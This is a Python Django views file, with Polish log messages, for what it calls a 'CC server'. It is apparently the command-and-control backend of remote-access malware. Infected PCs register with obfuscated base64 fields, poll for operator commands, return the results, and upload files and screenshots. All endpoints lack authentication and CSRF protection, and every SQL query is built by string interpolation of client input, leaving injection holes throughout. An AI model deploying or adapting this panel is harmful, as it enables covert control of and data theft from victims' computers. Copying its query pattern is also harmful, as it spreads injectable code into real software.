# -*- coding: utf-8 -*-

from django.http import HttpResponse
from django.http import JsonResponse
from django.shortcuts import render
from django.views.decorators.csrf import csrf_exempt
from django.core.files.storage import FileSystemStorage
from .dbask import db_fetchall, db_fetchone, db_update
from .timediff import get_diff
import random
import string
import re
import base64
import os
import time
import shutil
import platform
import json
from .b64dec import dec_data


BASE_DIR = os.path.dirname(os.path.dirname(os.path.abspath(__file__)))
DET_OS = str(platform.uname())

if 'Windows' in DET_OS:
    print('==== URUCHOMIONO NA WINDOWS ====')
    filespath = '%s\media\client_ups\%s'
else:
    print('==== URUCHOMIONO W ŚRODOWISKU LINUX ====')
    filespath = '%s/media/client_ups/%s'



"""

Index function - main site, with database of associated PC's.
From this site is possible to execute functions, defined in html file (index.html).

"""

def index(request):
    return render(request, 'index.html', {})

def clients(request):
    # Get associated PC's lists
    host_list = db_fetchall('SELECT * FROM users2 '
                            'ORDER BY id')
    mac_list = db_fetchall('SELECT det_mac FROM users2 '
                           'ORDER BY id')
    #print(host_list)
    #print(mac_list)
    time_curr = time.strftime('%Y-%m-%d %H:%M:%S')
    # Time list to check that connection with host is timed out or not (see index.html file)
    for mac in mac_list:
        # Get character in specific mac
        #print(mac[0])
        la_db = db_fetchone('SELECT last_activity FROM users2 '
                            'WHERE det_mac = \'%s\''
                            % mac[0])[0]
        #print(la_db)
        if la_db is not None:
            la_diff = get_diff(time_curr, la_db)
        else:
            la_diff = 'N/A'
        db_update('UPDATE users2 SET la_diff = \'%s\' '
                  'WHERE det_mac = \'%s\''
                  % (la_diff, mac[0]))
        # If folder with filtered mac name exists, update DB
        if os.path.isdir(filespath % (BASE_DIR,  mac[0])) == True:
            db_update('UPDATE users2 '
                      'SET files = \'%s\' '
                      'WHERE det_mac = \'%s\''
                      % (mac[0], mac[0]))
        else:
            pass

    return render(request, 'clients.html', {
        'host_list': host_list,
        'time_curr': time_curr,
        'mac_list': mac_list,
    })


"""

Register - function that allows to add remote PC to database,
or update old information.

"""


@csrf_exempt
def register(request):
    if request.method == 'POST':
        print('==== KLIENT PRZEDSTAWIA SIE ====')
        data = dec_data(request.POST.get('a3Vyd'))
        for key, value in data.items():
            print(key + ' : ' + value)
        # Check that connecting PC is new or not
        is_new = str(db_fetchone('SELECT * FROM users2 '
                                 'WHERE det_mac = \'%s\''
                                 % data.get('det_mac')))
        #print(is_new)
        if is_new == 'None':
            db_update(
                'INSERT INTO users2 (det_mac, det_os, det_name, det_int_ip, det_ext_ip) '
                'VALUES (\'%s\', \'%s\', \'%s\', \'%s\', \'%s\')'
                % (data.get('det_mac'), data.get('det_os'), data.get('det_name'),
                 data.get('det_int_ip'), data.get('det_ext_ip')))
            if not os.path.exists(filespath % (BASE_DIR, (data.get('det_mac')))):
                os.makedirs(filespath % (BASE_DIR, (data.get('det_mac'))))
            print('==== DODANO NOWY PC DO BAZY ====')
            return HttpResponse('Dodano nowego klienta %s do DB' % data.get('det_mac'))
        elif (data.get('det_mac') in is_new) and ((data.get('det_int_ip') or data.get('det_ext_ip')) not in is_new):
            db_update(
                'UPDATE users2 '
                'SET det_os = \'%s\', det_name = \'%s\', '
                'det_int_ip = \'%s\', det_ext_ip = \'%s\' '
                'WHERE det_mac = \'%s\''
                %(data.get('det_os'), data.get('det_name'), data.get('det_int_ip'),
                 data.get('det_ext_ip'), data.get('det_mac')))
            return HttpResponse('Zaktualizowan twojego klienta %s w DB' % data.get('det_mac'))
        else:
            print('==== KLIENT JEST W BAZIE, AKTUALIZUE JEZELI KONIECZNE ====')
            return HttpResponse('Twoj klient %s istnieje już w DB.' % data.get('det_mac'))

    else:
        return HttpResponse('No i gdzie te dane z POST?')


"""

Function command - add record to DB with some unique identifier, command to be executed and mac(s) 
- for apply this command on remote PC, when remote PC will request for order page.

"""


@csrf_exempt
def command(request):

    """

    Every time when new command is requested to be executed on remote PC's,
    the new uniqueid is generated. This should prevent to duplicate executing
    commands on remote PC's.

    """

    def get_unique_id(size=6, chars=string.ascii_uppercase + string.digits):
        return ''.join(random.choice(chars) for _ in range(size))
    if request.method == 'POST':
        sel_users = []
        new_uniqueid = str(get_unique_id())
        print('==== NOWE uniqueid W ZWIAZKU Z NOWO WYWOLANA KOMENDA ====')
        print(new_uniqueid)
        print('==== DRUKUJE NOWA KOMENDE I PARAMETRY ====')
        for key, value in request.POST.items():
            print(key + ' : ' + value)
        # There is command, that allow to delete user by CC center
            if 'det_mac' in key:
                db_update('UPDATE users2 '
                          'SET uniqueid = \'%s\', command = \'%s\' '
                          'WHERE det_mac = \'%s\''
                          % (new_uniqueid, request.POST.get('command'),
                           request.POST.get(key)))
                sel_users.append(request.POST.get(key))
                if 'deluser' in request.POST.get('command'):
                    print('==== USUWAM KLIENTA %s Z DB ====' %request.POST.get(key))
                    db_update('DELETE from users2 '
                              'WHERE det_mac = \'%s\''
                              % request.POST.get(key))
                    if os.path.isdir(filespath % (BASE_DIR, request.POST.get(key))) == True:
                        shutil.rmtree(filespath % (BASE_DIR, request.POST.get(key)),
                                      ignore_errors=True)
                    else:
                        pass
                else:
                    pass
            else:
                pass
        # Otherwise, add some records to DB and generate site (generated site is only for information purposes)
        db_update('UPDATE lastuniqueid '
                  'SET uniqueid = \'%s\' '
                  'WHERE uniqueid LIKE \'______\''
                  % new_uniqueid)
        return HttpResponse('%s;%s;%s' % (new_uniqueid, request.POST.get('command'), sel_users))
    else:
        return HttpResponse('Przeciez POST jest pusty...')


"""

Most complicated function here :) Get result of executed command from remote PC.
Important: this is used for transfer only text data.

"""


@csrf_exempt
def result(request):
    if request.method == 'POST':
        # res_params list is used for get result and last activity and store them. Rest of data is in request.POST dict
        data = dec_data(request.POST.get('a3Vyd'))
        #print(result_data)
        host_re = {}
        print('==== KLIENT PRZESYLA REZULTAT WYKONANEJ KOMENDY ====')
        for key, value in data.items():
            #print(key + ' : ' + value)
            if 'func_result' in key:
                #print('==== MAM KEY ====')
                #print(value)
                #value_enc = base64.b64decode(value).decode('utf-8')
                # Decode data received as result, because the data is encoded (base64)
                value_filter = value.replace('<DIR>', '=DIR=')
                #print('==== DRUKUJE CZYSTY REZULTAT Z FILTRAMI DO DB ====')
                #print(value_filter)
                host_re['result'] = value_filter
            elif 'last_activity' in key:
                # Add second parameter to list - last activity, which also was send by remote PC
                host_re['last_activity'] = value
            else:
                pass
        print('==== DRUKUJE PARAMETRY DO ZAPISU DO DB ====')
        for key, value in host_re.items():
            print(key + ' : ' + value)
        # Adding result to database
        db_update(
                'UPDATE users2 '
                'SET result = \'%s\', last_activity = \'%s\' '
                'WHERE det_mac = \'%s\' AND uniqueid = \'%s\''
                % (host_re.get('result'), host_re.get('last_activity'),
                 data.get('det_mac'), data.get('uniqueid')))
        # Return result on generated site - only for information purposes
        return HttpResponse(
            '%s, %s, %s, %s' % (host_re.get('result'), host_re.get('last_activity'), data.get('det_mac'),
                                data.get('uniqueid'))
                            )
    else:
        return HttpResponse('POST pusty, przeslij jeszcze raz!')


"""

Function generate order page, for remote PC, which remote PC try to get
current command and other data from CC server.
The command and data was generated earlier by command function.

"""


@csrf_exempt
def order(request):
    if request.method == 'POST':
        data = dec_data(request.POST.get('a3Vyd'))
        print('==== ŻĄDANIE KLIENTA PO AKTUALNA KOMENDE I uniqueid =====')
        curr_uniqueid = re.search('\(\'(.*)\',\)', str(db_fetchone('SELECT * from lastuniqueid'))).group(1)
        print(curr_uniqueid)
        command = db_fetchone(
            'SELECT command FROM users2 '
            'WHERE uniqueid = \'%s\' AND det_mac =\'%s\''
            % (curr_uniqueid, data.get('det_mac')))
        print(command)
        if command is not None:
            function = (re.search('#(.*)\(', str(command[0])).group(1))
            params = (re.search('\((.*)\)', str(command[0])).group(1)).split(' ')
        else:
            function = 'None'
            params = 'None'
        todo = {'uniqueid': curr_uniqueid, 'function': function, 'params': params}
        todo_str = base64.b64encode((str(todo).replace('\'', '"')).encode('UTF-8')).decode('UTF-8')
        content = {'65hFDs': todo_str}
        return JsonResponse(content)


""" 

When the host check order page, and there is unknown command or no-mac,
remote PC send a ping signal, that means, that remote PC is in IDDLE mode.
Important: this is only one function, that have other name and url
(see urls.py - ping / last_activity).

"""


@csrf_exempt
def last_activity(request):
    if request.method == 'POST':
        data = dec_data(request.POST.get('a3Vyd'))
        print('==== KLIENT PRZESYLA PING ====')
        for key, value in data.items():
            print(key + ' : ' + value)
        db_update('UPDATE users2 '
                  'SET last_activity = \'%s\' '
                  'WHERE det_mac = \'%s\''
                  % (data.get('last_activity'), data.get('det_mac')))
        return HttpResponse('%s, %s' % (data.get('last_activity'), data.get('det_mac')))
    else:
        return HttpResponse('Serio? Pusty POST?')


"""

Upload site, for upload remote files from remote PC (screenshots and other files).
A lot of informations about processing files was found on stackoverflow.

"""


@csrf_exempt
def upload(request):
    if request.method == 'POST' and request.FILES['f1L3']:
        data = dec_data(request.POST.get('a3Vyd'))
        file = request.FILES['f1L3']
        #print(str(file))
        # Procedure which save file in specific folder
        fs = FileSystemStorage(location=(filespath % (BASE_DIR, (data.get('det_mac')))))
        filename = fs.save(file.name, file)
        print('==== KLIENT PRZESYLA PLIK ====')
        for key, value in request.POST.items():
            print(key + ' : ' + value)
        print(filename)
        print('Det mac')
        print(data.get('det_mac'))
        # Page generated only for test purposes
        return HttpResponse('Otrzymano plik %s od %s' % (filename, data.get('det_mac')))
    else:
        return HttpResponse('Dane POST znow nieprzeslane!')


"""

Because there was problems with directory listing via django,
the special procedure to generate list of files on webpage was developed.

"""


@csrf_exempt
def listfiles(request, folder):
    files = os.listdir(filespath % (BASE_DIR, folder))
    # Render a webpage with links to files
    return render(request, 'files.html', {
        'files': files,
        'folder': folder
    })